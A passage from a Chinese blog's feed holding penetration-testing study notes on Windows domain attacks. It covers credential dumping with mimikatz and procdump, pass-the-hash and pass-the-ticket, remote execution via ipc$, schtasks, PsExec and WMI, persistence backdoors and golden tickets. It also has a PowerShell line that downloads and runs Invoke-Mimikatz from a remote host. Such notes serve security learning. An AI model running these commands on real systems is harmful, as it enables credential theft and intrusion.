导入令牌</span><br></code></pre></td></tr></table></figure><p>学习文章</p><p><a href="https://hackergu.com/powerup-stealtoken-rottenpotato/">https://hackergu.com/powerup-stealtoken-rottenpotato/</a></p><h5 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h5><p><strong>LLMNR和NetBIOS欺骗攻击</strong></p><p>LLMNR（本地链路多播名称解析）是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR解析本地网段中机器的名称，指导DNS回复正常为止。LLMNR支持IPv6</p><p>NetBIOS是一种网络协议，根据NetBIOS协议广播获得计算机名称，并将其解析为相应的IP地址，NetBIOS不支持IPv6</p><p>Net-NTLM Hash 与 NTLM Hash不同</p><p>NTLM Hash 是指Windows操作系统的Security Account Manager中保存的用户密码散列值。NTLM Hash通常保存在windows中的SAM文件或者ntds.dit数据库中，用户对访问资源的用户进行身份验证</p><p>Net-NTLM Hash 是指在网络环境中经过NTLM认证的散列值。挑战/响应验证中的响应就包含了Net-NTLM Hash，使用Responder抓取的通常就是Net-NTLM Hash，攻击者无法使用该散列值进行哈希传递攻击，只能使用Hashcat等工具获得明文后进行横向移动</p><p>攻击工具可以使用<code>Responder</code></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><h5 id="Windows远程连接和相关命令"><a href="#Windows远程连接和相关命令" class="headerlink" title="Windows远程连接和相关命令"></a>Windows远程连接和相关命令</h5><p><strong>IPC</strong></p><p>IPC共享“命名管道”的资源，为了实现远程进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。</p><p>通过<code>ipc$</code>可以与目标机器建立连接，利用这个连接可以访问目标机器中的文件，进行上传下载操作和运行其他命令</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">建立一个ipc$<br>net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">17.18</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;password&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br>查看已经建立的连接<br>net <span class="hljs-keyword">use</span><br></code></pre></td></tr></table></figure><p><code>ipc$</code><strong>利用条件</strong></p><ul><li><p>开启了139、445端口</p></li><li><p>管理员开启了默认共享</p><p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘（c$ d$ e$）和系统目录winnt或windows（admin$），通过<code>ipc$</code>，可以实现对这些默认共享目录的访问</p></li></ul><p><code>ipc$</code><strong>连接失败的原因</strong></p><ul><li>用户名和密码错误</li><li>没有打开<code>ipc$</code>默认共享</li><li>不能成功连接目标的139和445端口</li><li>命令输入错误</li></ul><p><strong>常见的错误号</strong></p><ul><li>错误号 5：拒绝访问</li><li>错误号51：无法找到网络路径，网络中存在问题</li><li>错误号53：找不到网络路径，包括IP地址错误，目标未开机，目标的<code>lanmanserver</code>服务未启动，目标有防护墙（端口过滤）</li><li>错误号67：找不到网络名，包括<code>lanmanserver</code>服务未启动，<code>ipc$</code>已被删除</li><li>错误号1219：提供的凭据与已存在的凭据集冲突，例如已经和目标建立<code>ipc$</code>，需要在错误原链接后重新进行连接</li><li>错误号1326：未知的用户名和密码</li><li>错误号1792：试图登录，但是网络登录服务没有启动</li><li>错误号2242：用户密码已经过期</li></ul><p><strong>windows自带工具获取远程主机信息</strong></p><ol><li><p><code>dir</code>命令</p><p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>dir</code>列出远程主机的文件</p></li><li><p><code>tasklist</code></p><p>使用<code>net use</code>命令与远程目标机器建立<code>ipc$</code>后，可以使用<code>tasklist</code>命令的<code>/S /U /P</code>参数列出远程主机上运行的进程</p></li></ol><p><strong>计划任务</strong></p><ol><li><p><code>at</code>命令</p><blockquote><p>at 是windows自带的创建计划任务的命令，主要工作在Windows server 2008 之前的版本</p></blockquote><p>使用<code>at</code>命令在远程目标机器上面创建计划任务流程</p><ol><li><p>使用<code>net time</code>命令确定远程机器当前的系统时间</p><p><code>net time \\192.168.1.17</code></p></li><li><p>将文件复制到目标系统</p><p><code>copy calc.bat \\192.168.1.17\C$</code></p></li><li><p>使用<code>at</code>创建计划任务</p><p><code>at \\192.168.1.17 4:11PM C:\cacl.bat</code></p><p>创建一个计划任务，内容是下午4：11运行C盘 下的<code>cacl.bat</code></p></li><li><p>清楚<code>at</code>记录</p><p><code>at \\192.168.1.17 jobID /delete</code></p></li></ol></li><li><p><code>schtasks</code>命令</p><blockquote><p>Windows Vist、Windows Server  2008及之后的版本将at命令废弃了，攻击者就用schtasks命令代替</p></blockquote><p>在远程主机上创建一个名称为<code>test</code>的计划任务，该任务在开机时启动C盘下的<code>cacl.bat</code>权限为system</p><p><code>schtasks /create /s 192.168.1.17 /tn teat /sc onstart /tr c:\cacl.bat /ru system /f</code></p><p>在远程主机上运行计划任务<code>test</code></p><p><code>schtasks /run /s 192.168.1.17 /i /tn &quot;test&quot;</code></p><blockquote><p>在使用schtasks命令的时候不用输入密码，因为之前与目标 机器已经建立了ipc$连接，如果没有建立连接可以在执行的时候自己添加/u /p参数</p></blockquote><p>删除计划任务</p><p><code>schtasks /delete /s 192.168.1.17 /tn &quot;test&quot; /f</code></p><blockquote><p>schtasks命令执行后会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt，如果执行命令后没有回显可以配合ipc$执行文件，使用type命令远程查看执行结果</p></blockquote><p>删除<code>ipc$</code></p><p><code>net use 名称 /del /y</code></p></li></ol><h5 id="散列值获取分析"><a href="#散列值获取分析" class="headerlink" title="散列值获取分析"></a>散列值获取分析</h5><p><strong>LM Hash 和 NTLM Hash</strong></p><p>windows通常使用两种方法对用户的密码进行加密处理，域环境中用户的信息 存储在<code>ntds.dit</code>中，加密后为散列值，从Windows Vista 和Windows Server 2008版本开始，Windows 就默认禁用了LM Hash。NTLM Hash是微软为了提高安全性的同时保证兼容性而设计的散列加密算法，NTLM Hash是基于MD4 加密算法加密的。</p><p><strong>单机密码抓取与防范</strong></p><blockquote><p>想要在Windows中抓取散列值和明文密码，必须将权限提升到System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。lsass.exe 进程用户Windows的安全策略（本地安全策略和登录策略）。</p><p>SAM文件保存的位置 在C:\Windows\System32\config中</p></blockquote><p>下面是常见的单机密码抓取工具</p><ol><li><p><code>GetPass</code></p><p>直接运行即可获取密码</p></li><li><p><code>PwDump7</code></p><p>直接运行即可</p></li><li><p><code>QuarksPwDump</code></p><p>运行<code>QuarksPwDump.exe --dump-hash-local</code>就可以导出用户的NTLM Hash</p><p>它已经被大多数杀软标记为恶意软件</p></li><li><p>通过SAM和System文件抓取密码</p><ol><li><p>到处SAM文件和System文件</p><p><code>reg save hklm\sam sam.hive</code></p><p><code>reg save hklm\system system.hive</code></p></li><li><p>读取文件获得NTLM Hash</p><ul><li><p>使用<code>mimikatz</code>读取文件</p><blockquote><p>mimikatz是由法国的技术高手使用c语言写的系统调试工具，可以从内存中提取明文密码、散列值、PIN和Kerberos票据，它也可以执行哈希传递，票据传递或者构建黄金票据</p></blockquote><p>将<code>sam.hive</code> <code>system.hive</code>文件放到mimikatz的同一个目录下面</p><p><code>lsadump::sam/sam:sam.hive /system:system.hive</code></p></li><li><p>使用Cain读取</p></li><li><p>使用<code>mimikatz</code>直接读取</p><blockquote><p>直接在目标机器上面运行</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug 提升权限<br>token::elevate 将权限提升到system<br>lsadump::sam 读取本地的SAM文件，获取NTLM Hash<br></code></pre></td></tr></table></figure></li></ul></li></ol></li></ol><ol start="5"><li><p><code>mimikatz</code>在线读取SAM</p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p></li><li><p><code>mimikatz</code>离线读取<code>lsass.dmp</code>文件</p><ol><li><p>导出<code>lsass.dmp</code>文件</p><ul><li><p>使用任务管理器导出</p><p>在任务管理器中找到<code>lsass.dmp</code>文件，右键选择”Create Dump File”</p></li><li><p>使用<code>procdump</code>导出</p><blockquote><p>这个是微软发布的工具所以不会被杀软查杀</p></blockquote><p><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code> </p></li></ul></li><li><p>使用<code>mimikatz</code>获取</p><p>先在命令环境运行<code>mimikatz</code>，将<code>lsass.dmp</code>文件加载到<code>mimikatz</code>当中，输入命令<code>sekurlsa::minidump lsass.DMP</code>，如果显示<code>Switch to MINIDUMP</code>就表示成功，最后输入<code>sekurlsa::logonPasswords full</code> 命令导出散列值</p></li></ol></li><li><p>使用<code>Powershell</code>对散列值进行Dump操作</p><p>进入Nishang目录，将Get-PassHashes.ps1脚本导入</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-keyword">Import</span>-M,odule .\<span class="hljs-keyword">Get</span>-PassHashes.ps1<br><span class="hljs-keyword">Get</span>-PassHashes<br></code></pre></td></tr></table></figure></li><li><p><code>Powershell</code>远程加载<code>mimikatz</code></p><p><code>powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.101/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz</code></p><p><a href="https://www.freebuf.com/articles/web/176796.html">九种姿势运行Mimikatz </a></p></li></ol><p><strong>使用Hashcat获取密码</strong></p><p>这是一个密码破解软件，kali自带了，具体使用可以查看它提供的帮助</p><h5 id="哈希传递攻击-PTH"><a href="#哈希传递攻击-PTH" class="headerlink" title="哈希传递攻击(PTH)"></a>哈希传递攻击(PTH)</h5><p>如果计算机本地管理员账户和密码也是相同的，攻击者就可以利用哈希传递攻击的方法登录内网中的其他计算机</p><p><strong>使用NTLM Hash进行哈希传递</strong></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">ntlm:</span>NTLM Hash<br></code></pre></td></tr></table></figure><p>列出远程主机C盘的内容</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">dir <span class="hljs-tag">\<span class="hljs-name">\</span></span>主机名<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$</span><br></code></pre></td></tr></table></figure><p><strong>使用AES-256密钥进行哈希传递</strong></p><blockquote><p>远程系统必须安装 KB2871997</p></blockquote><p>使用<code>mimikatz</code>抓取密钥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::ekeys</span><br></code></pre></td></tr></table></figure><p>以管理员命令运行<code>mimikatz</code></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy">mimikatz.exe<br><span class="hljs-attr">privilege:</span>:debug<br><span class="hljs-attr">sekurlsa:</span>:path <span class="hljs-regexp">/user:administrator /</span><span class="hljs-attr">domain:</span>lcdm123.com /<span class="hljs-attr">aes256:</span>AES<span class="hljs-number">-256</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong></p><ol><li><code>dir</code>后面要使用主机名，而不是IP</li><li>AES-128密钥也可以用来Hash传递</li><li>使用AES密钥对远程主机进行哈希传递的前提是安装KB2871997</li><li>安装了KB2871997后仍然可以使用SID为500的用户的NTLM Hash进行哈希传递</li><li>要使用<code>mimikatz</code>的哈希传递功能，需要具有本地管理员的权限</li></ol><blockquote><p>KB2871997通过禁止本地管理员权限与远程计算机进行连接，无法通过本地管理员权限对远程计算机使用PsExec，WMI，smbexec，schtasks，at，也无法访问远程主机的文件共享。但是对于Administrator（SID为500）的账户依然可以进行哈希传递</p></blockquote><h5 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h5><ol><li><p>使用<code>mimikatz</code>进行票据传递</p><p>导出内存中的票据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz.exe<br>privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>执行命令后，会在当前目录中出现多个服务的票据文件<br><br>kerberos::purge  清除内存中的票据<br><br>kerberos::ptt PATH  注入票据<br></code></pre></td></tr></table></figure></li><li><p>使用<code>kekeo</code>进行票据传递</p><p>工具下载：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p><code>kekeo</code>需要域名，用户名，NTLM Hash三者配合生成票据，再将票据导入</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less">生成票据<br><span class="hljs-selector-tag">kekeo</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">tgt</span><span class="hljs-selector-pseudo">::ask</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:lcdm123.com</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:NTLM</span> <span class="hljs-selector-tag">Hash</span><br>清除票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::purge</span> # <span class="hljs-selector-tag">kekeo</span>的命令<br><span class="hljs-selector-tag">klist</span> <span class="hljs-selector-tag">purge</span> # <span class="hljs-selector-tag">Windows</span>自带的命令<br>导入票据<br><span class="hljs-selector-tag">kerberos</span><span class="hljs-selector-pseudo">::ptt</span> <span class="hljs-selector-tag">PATH</span><br></code></pre></td></tr></table></figure></li></ol><p><strong>注意</strong></p><ul><li>票据文件注入内存的默认有效时间是10小时</li><li>在目标机器上不需要本地管理员权限就可以进行票据传递</li></ul><h5 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h5><p><code>PsExec</code>运行的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为<code>PSEXECSVC</code>的二进制文件，然后通过<code>psexec</code>服务运行命令，运行结束后删除服务</p><ol><li><p>已经建立了<code>ipc$</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">PsExec</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> \\192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.17</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">-accepteula</span> 使用该参数就不会弹出确认框<br><span class="hljs-selector-tag">-s</span> 以<span class="hljs-selector-tag">System</span>权限获取交互式的<span class="hljs-selector-tag">shell</span>，如果不加就会获得一个<span class="hljs-selector-tag">Administrator</span>的<span class="hljs-selector-tag">shell</span><br></code></pre></td></tr></table></figure></li><li><p>未建立<code>ipc$</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe<br><br>PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span> 执行命令<br></code></pre></td></tr></table></figure></li></ol><p><strong>注意</strong></p><ul><li>远程系统默认开启<code>admin$</code>共享（默认是开启的）</li><li>使用过程中会留下大量日志需要注意</li><li>MSF也有PsExec的相应模块提供使用</li></ul><h5 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h5><p><code>WMI(Windows Management Instrumentation)</code>，它是由一系列工具集组成的，可以从本地或者远程管理计算机系统，从Windows 98开始，windows操作系统都支持WMI。WMI的操作默认不会产生日志。</p><p><strong>基本命令</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic /node:192.168.1.17 /user:administrator /password:PassWord process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span>  将执行结果保存在C盘中<br><br>type \\192.168.1.17\C$\ip.txt  建立ipc$后，使用type命令读取结果<br></code></pre></td></tr></table></figure><p>wmic执行远程命令，在远程系统中启动WMI服务（服务端口为135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标系统有防火墙就无法连接，wmic就无法连接，wmic命令没有回显，需要使用<code>ipc$</code>和type命令来读取信息，如果wmic执行的是恶意程序也不会留下日志。</p><p><strong>impacket工具包中的wmiexecc</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmiexec.py administrator:<span class="hljs-symbol">Password@</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br></code></pre></td></tr></table></figure><p>主要用于Linux相关</p><p><strong>wmiexec.vbs</strong></p><p><code>wmiexec.vbs</code>脚本是通过VBS调用WMI来模拟PsExec的功能，可以在远程系统中执行命令并进行回显，获得半交互式shell</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">cscript.exe</span> <span class="hljs-string">//nologo</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/shell</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-comment"># 建立半交互式shell</span><br><span class="hljs-string">cscript.exe</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/cmd</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment"># 执行单条命令</span><br></code></pre></td></tr></table></figure><p>对于一些运行时间较长的命令，需要添加<code>-wait 5000</code> 或者更长的时间参数；在运行nc这种不需要输出结果但是需要一直运行的命令时，使用<code>-persist</code>参数，就不需要使用<code>taskkill</code>命令来远程结束进程</p><blockquote><p>已经被许多杀软列入黑名单</p></blockquote><p><strong>Invoke-WmiCommand</strong></p><p><code>Invoke-WmiCommand.ps1</code>脚本包含在<code>PowerSploit</code>工具包中，它通过<code>Powershell</code>调用WMI来远程执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 目标系统用户名</span><br>$User=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br>$Password= ConvertTo-SecureString -<span class="hljs-keyword">String</span> <span class="hljs-string">&quot;Password&quot;</span> -AsPlainText -Force<br><span class="hljs-comment"># 将账号和密码整合起来</span><br>$Cred= <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br><span class="hljs-comment"># 远程执行命令</span><br>$Remote=Invoke-WmiComand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br><span class="hljs-comment"># 将执行结果输出到屏幕</span><br>$Remote.PayloadOutput<br></code></pre></td></tr></table></figure><p><strong>Invoke-WMIMethod</strong></p><p>利用<code>Powershell</code>自带的<code>Invoke-WMIMethod</code>可以在远程执行命令和指定程序，在Powershell命令行环境中执行如下命令，可以以非交互式的方法执行命令，但是不会回显结果</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 目标系统用户名</span><br><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br><span class="hljs-variable">$Password</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># 将账号和密码整合起来</span><br><span class="hljs-variable">$Cred</span>= <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><span class="hljs-comment"># 在远程系统中运行计算机程序</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-literal">-Class</span> Win32_Process <span class="hljs-literal">-Name</span> Create <span class="hljs-literal">-ArgumenList</span> <span class="hljs-string">&quot;cacl.exe&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.1.17&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><h5 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h5><blockquote><p>使用smbexec时目标系统的共享必须开放（C$  ipc$ admin$）</p></blockquote><p><strong>C++版的smbexec</strong></p><p>test.exe 客户端主程序</p><p>execserver.exe 目标系统中的辅助程序</p><p>常用命令<code>test.exe ip username password  command netshare</code></p><p>使用</p><ul><li><p>将exeserver.exe上传到目标系统的C:\Windows目录下，解除UAC对命令执行的限制</p><p><code>net use \\192.168.1.17 &quot;Password&quot; /user:lcdm123\administrator</code></p></li><li><p>在客户端执行</p><p><code>test.exe 192.168.1.17 administrator Password whoami c$</code></p></li></ul><p><strong>impacket工具包中的smbexec.py</strong></p><p><code>smbexec.py lcdm123/administrator:password@192.168.1.17</code></p><p><strong>DCOM在远程系统中的使用</strong></p><blockquote><p>DCOM（分布式组件对象模型）时微软的一系列概念和程序接口，通过DCOM客户端程序对象能够向网络中的另一台计算机上的服务程序对象发送请求</p><p>DCOM是基于组件对象模型（COM）的，COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口</p></blockquote><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h5><ul><li><p>粘滞建后门</p><p>使用后门程序替换<code>windows\system32</code>下的<code>sethc.exe</code>文件</p></li><li><p>注册表后门</p><p>在普通用户权限下，攻击者将需要执行的后门程序或者而脚本路径填写到注册表键<code>HACK:Software\Microsoft\Windows\CurrentVersion\Run</code>中（键名任意）</p></li><li><p>计划任务后门</p><ul><li>MSF中模拟计划任务后门</li><li>PowerShell中模拟计划任务后门</li><li>Empire中模拟计划任务后门</li></ul></li><li><p>meterpreter后门</p><p>persistence是meterpreter自带的后门程序，是一个使用安装自启动方式的持久性后门程序</p></li><li><p>Cymothoa后门</p><p>Cymothoa是一款可以将shellcode注入先后进程（插进程）的后门工具</p></li><li><p>WMI型后门</p><p>WMI型后门只能由具有管理员权限的用户运行，WMI型后门通常是由Powershell编写的，可以直接从新的WMI属性中读取和执行后门代码，给代码加密，通过这种方法，攻击者可以在系统中安装一个具有持久性的后门并且不会再系统磁盘中留下任何文件</p><p>WMI型后门使用了WMI的两个特征：无文件和无进程，基本原理是将代码加密存储再WMI中，达到所谓的无文件；当设定的条件被满足时系统将启动Powershell进程去执行后门程序，执行后进程将消失（时间根据后门的运行情况而定）达到所谓的无进程</p></li></ul><h5 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h5><blockquote><p>这个感觉就是比平时一句话木马差不多的后门</p></blockquote><ul><li>Nishang下的webshell</li><li>weevely后门</li><li>webacoo后门</li><li>MSF中的ASPX，PHP后门</li><li>………………</li></ul><h5 id="域控制器权限持久化"><a href="#域控制器权限持久化" class="headerlink" title="域控制器权限持久化"></a>域控制器权限持久化</h5><ul><li><p>DSRM域后门</p><p>DSRM（目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（DSRM账户）</p><p>DSRM的用途：允许管理员再域环境中出现故障或崩溃时还原，修复，重建活动目录数据库</p><p>渗透测试中可以使用DSRM账户对域环境进行持久化操作，如果域控版本为win server 2008 需要安装KB961320才可以使用指定域账户的密码对DSRM进行同步，再之后的版本不需要安装，如果是Windows server 2003则不能使用这个方法进行持久化</p></li><li><p>SSP维持域控权限</p><p>简单SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能，例如NTLM，kerberos等</p><p>SSPI（安全支持提供程序接口）是windows操作系统在执行操作时使用的API接口，可以说SSPI是SSP的API接口</p><p>SSP持久化操作的原理：LSA用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略，在启动时，SSP将被加载到lsass.exe进程中，但是假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就可以获得lsass.exe进程中的明文密码，这样即使用户更改密码并重新登录，攻击者依然能获取到明文密码。</p></li><li><p>SID History域后门</p><p>每个用户都有自己的SID，SID的作用就是跟踪安全主体控制用户连接资源时的访问权限，SID History是域迁移过程中需要使用的一个属性。</p><p><strong>SID History的作用就是在域迁移的过程中保持域用户的访问权限</strong>，即如果钱以后用户的SID改变了，系统将其原来的SID添加到钱以后用户的SID History中，使迁移后的用户保持原有的权限，能够访问原来可以访问的资源。</p></li><li><p>黄金票据</p><p>假设域内存在一个SID为502的域账户为krbtgt，它是KDC服务使用的账户，属于Domain Admins组，域环境中，每个用户账户的票据都是由krbtgt生成的，如果拿到了krbtgt的NTLM Hash 或者 AES-256值就可以伪造域内任意用户的身份访问其他服务</p><p>使用黄金票据进行票据传递攻击时需要的信息：</p><ul><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash 或 AES-256值</li><li>需要伪造的域管理员用户名</li></ul></li><li><p>白银票据</p><p>不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问服务的TGT，因为票据生成的过程中不会使用所以可以绕过域控，很少留下日志。白银票据依赖于服务账户的密码散列值，通过相应的服务账号来伪造TGS，例如 LDAP，MSSQL，DNS等，范围有限只能获取对应服务的权限。</p><p>黄金票据是由krbtgt账号加密的，白银票据是由特定的服务账号加密的</p><p>白银票据攻击时需要的信息：</p><ul><li>域名</li><li>域SID</li><li>目标服务器的FQDN</li><li>可利用的服务</li><li>服务账户的NTLM Hash</li><li>需要伪造的用户名</li></ul></li><li><p>Skeleton Key</p><p>使用Skeleton Key （万能密码），可以对域内权限进行持久化操作，可以使用mimikatz和Emoire的操作将Skeleton Key注入lsass.exe中</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;知识点梳理-amp-复现&quot;&gt;&lt;a href=&quot;#知识点梳理-amp-复现&quot; class=&quot;headerlink&quot; title=&quot;知识点梳理 &amp;amp; 复现&quot;&gt;&lt;/a&gt;知识点梳理 &amp;amp; 复现&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;要求：写清楚各个知识点，环</summary>
      
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java反射</title>
    <link href="http://example.com/2021/10/12/Java%E5%8F%8D%E5%B0%84/"/>
    <id>http://example.com/2021/10/12/Java%E5%8F%8D%E5%B0%84/</id>
    <published>2021-10-12T07:55:12.000Z</published>
    <updated>2021-10-23T03:20:59.668Z</updated>
    
